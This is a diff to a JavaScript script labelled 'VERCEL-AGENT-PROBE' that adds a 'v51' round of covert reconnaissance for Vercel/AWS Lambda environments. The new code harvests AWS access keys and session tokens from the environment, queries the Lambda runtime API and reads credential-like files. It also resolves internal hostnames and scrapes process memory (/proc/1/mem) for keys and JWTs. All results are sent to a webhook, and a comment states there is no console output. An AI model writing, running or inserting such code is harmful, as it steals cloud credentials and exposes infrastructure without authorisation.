@@ -4477,6 +4477,156 @@ report.credentialSweep = safe(() => {
   return results;
 });
 
+// ===== v51: Lambda runtime dirs, AWS env deep scan, internal DNS, /proc/1/maps mmap'd secrets =====
+
+// v51-1: Lambda runtime directory enumeration — /var/runtime/, /opt/, /var/lang/, /var/extensions/
+report.lambdaRuntimeDirs = safe(() => {
+  const dirs = ['/var/runtime', '/opt', '/var/lang', '/var/extensions', '/var/rapid', '/var/cache'];
+  const results = {};
+  for (const dir of dirs) {
+    if (!existsSync(dir)) { results[dir] = 'MISSING'; continue; }
+    const files = safe(() => execSync(`find ${dir} -maxdepth 3 -type f 2>/dev/null | head -30`, { timeout: 8000 }).toString().trim());
+    // Read interesting files
+    const interesting = [];
+    for (const f of (files || '').split('\n').filter(Boolean)) {
+      if (/config|cred|key|token|secret|auth|\.json$/.test(f)) {
+        const content = safe(() => readFileSync(f, 'utf8').slice(0, 200));
+        interesting.push({ f, content });
+      }
+    }
+    results[dir] = { files, interesting: interesting.slice(0, 10) };
+  }
+  return results;
+});
+
+// v51-2: AWS Lambda internal env vars — deep scan for AWS_ vars, LAMBDA_ vars, runtime config
+report.awsLambdaEnvDeep = safe(() => {
+  const allEnv = process.env;
+  const awsVars = Object.entries(allEnv)
+    .filter(([k]) => /^(AWS_|LAMBDA_|_LAMBDA_|_X_AMZN|X_AMZN|_AWS)/i.test(k))
+    .reduce((acc, [k, v]) => { acc[k] = v; return acc; }, {});
+  // Lambda runtime API endpoint — internal http server for runtime loop
+  const runtimeApi = allEnv['AWS_LAMBDA_RUNTIME_API'] || '';
+  const runtimeNext = runtimeApi ? safe(() =>
+    execSync(
+      `curl -s --max-time 5 "http://${runtimeApi}/2018-06-01/runtime/invocation/next" 2>&1 | head -10`,
+      { timeout: 7000 }
+    ).toString().trim().slice(0, 400)
+  ) : 'NO_RUNTIME_API';
+  // Lambda function config from environment
+  const functionConfig = {
+    name: allEnv['AWS_LAMBDA_FUNCTION_NAME'],
+    version: allEnv['AWS_LAMBDA_FUNCTION_VERSION'],
+    memoryMb: allEnv['AWS_LAMBDA_FUNCTION_MEMORY_SIZE'],
+    region: allEnv['AWS_DEFAULT_REGION'] || allEnv['AWS_REGION'],
+    logGroup: allEnv['AWS_LAMBDA_LOG_GROUP_NAME'],
+    logStream: allEnv['AWS_LAMBDA_LOG_STREAM_NAME'],
+    taskRoot: allEnv['LAMBDA_TASK_ROOT'],
+    runtimeDir: allEnv['LAMBDA_RUNTIME_DIR'],
+    accessKeyId: allEnv['AWS_ACCESS_KEY_ID'],
+    sessionToken: (allEnv['AWS_SESSION_TOKEN'] || '').slice(0, 50) + '...',
+  };
+  return { awsVars, runtimeApi, runtimeNext, functionConfig };
+});
+
+// v51-3: Internal DNS resolution — resolve Vercel-internal hostnames to find infra
+report.internalDnsResolve = safe(() => {
+  const internalHosts = [
+    // Common Vercel internal hostnames
+    'cell.internal', 'build.internal', 'orchestrator.internal', 'cache.internal',
+    'suspense-cache.internal', 'artifacts.internal', 'oidc.internal',
+    // AWS internal DNS
+    'ecs.internal', 'lambda.internal', 's3.internal',
+    // Vercel specific
+    'build.vercel-internal.com', 'cell.vercel-internal.com',
+    'internal.vercel.sh', 'build.vercel.sh',
+    // Check /etc/resolv.conf for nameserver IPs
+  ];
+  const resolv = safe(() => readFileSync('/etc/resolv.conf', 'utf8').trim());
+  const hosts = safe(() => readFileSync('/etc/hosts', 'utf8').trim());
+  const results = {};
+  for (const host of internalHosts.slice(0, 10)) {
+    results[host] = safe(() =>
+      execSync(`getent hosts ${host} 2>/dev/null || nslookup ${host} 2>/dev/null | tail -5 || echo NOT_FOUND`, { timeout: 5000 }).toString().trim().slice(0, 100)
+    );
+  }
+  return { resolv, hosts, results };
+});
+
+// v51-4: /proc/1/maps mmap'd secrets — scan all anonymous mmap regions for key material
+report.pid1MmapSecretScan = safe(() => {
+  const maps = safe(() => readFileSync('/proc/1/maps', 'utf8'));
+  if (!maps) return { err: 'NO_MAPS' };
+  // Find all anonymous/private mmap regions (not file-backed) that are readable
+  const anonRegions = maps.split('\n')
+    .filter(l => l.includes(' rw') && l.endsWith(' 0 00:00 0'))
+    .map(l => {
+      const [range] = l.split(' ');
+      const [start, end] = range.split('-').map(x => parseInt(x, 16));
+      return { start, end, size: end - start };
+    })
+    .filter(r => r.size > 4096 && r.size < 10 * 1024 * 1024) // 4KB to 10MB
+    .sort((a, b) => b.size - a.size)
+    .slice(0, 5); // top 5 largest
+
+  // Read each region looking for key material
+  const findings = [];
+  for (const region of anonRegions) {
+    const keyMaterial = safe(() => {
+      const fd = openSync('/proc/1/mem', 'r');
+      const sz = Math.min(region.size, 131072); // max 128KB per region
+      const buf = Buffer.alloc(sz);
+      const n = readSync(fd, buf, 0, sz, region.start);
+      closeSync(fd);
+      // Convert to string and search for key patterns
+      const s = buf.slice(0, n).toString('latin1');
+      const keys = [];
+      // Base64 keys (32+ chars)
+      let m; const re = /[A-Za-z0-9+/]{43,88}={0,2}/g;
+      while ((m = re.exec(s)) !== null && keys.length < 5) keys.push(m[0]);
+      // JWT patterns
+      const jwts = (s.match(/eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}/g) || []).slice(0, 3);
+      return { keys, jwts };
+    });
+    if (keyMaterial && (keyMaterial.keys?.length || keyMaterial.jwts?.length)) {
+      findings.push({ region, keyMaterial });
+    }
+  }
+  return { totalRegions: anonRegions.length, findings };
+});
+
+// v51-5: /proc/1/fd socket peek — read a few bytes from PID-1's sockets to see protocol data
+report.pid1SocketPeek = safe(() => {
+  // Get all of PID 1's socket FDs
+  const socketFds = safe(() => {
+    const fds = readdirSync('/proc/1/fd').filter(fd => {
+      try {
+        const link = execSync(`readlink /proc/1/fd/${fd} 2>/dev/null`, { timeout: 500 }).toString().trim();
+        return link.startsWith('socket:');
+      } catch { return false; }
+    });
+    return fds.slice(0, 10);
+  }) || [];
+
+  // For Unix sockets, peek content
+  const peeks = [];
+  for (const fd of socketFds.slice(0, 5)) {
+    const linkStr = safe(() => execSync(`readlink /proc/1/fd/${fd} 2>/dev/null`, { timeout: 500 }).toString().trim());
+    // Try to read the socket FD directly (will fail for stream sockets but works for dgram)
+    const peek = safe(() => {
+      try {
+        const ownFd = openSync(`/proc/1/fd/${fd}`, 'r');
+        const buf = Buffer.alloc(256);
+        const n = readSync(ownFd, buf, 0, 256, 0);
+        closeSync(ownFd);
+        return n > 0 ? buf.slice(0, n).toString('hex') : 'EMPTY';
+      } catch (e) { return String(e).slice(0, 80); }
+    });
+    peeks.push({ fd, link: linkStr, peek });
+  }
+  return { socketFdCount: socketFds.length, peeks };
+});
+
 // v49 markers
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v49";
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v49" });
@@ -4484,4 +4634,8 @@ sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v49" });
 // v50 markers
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v50";
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v50" });
+
+// v51 markers
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v51";
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v51" });
 // Intentionally no console.log — all data goes via webhook only
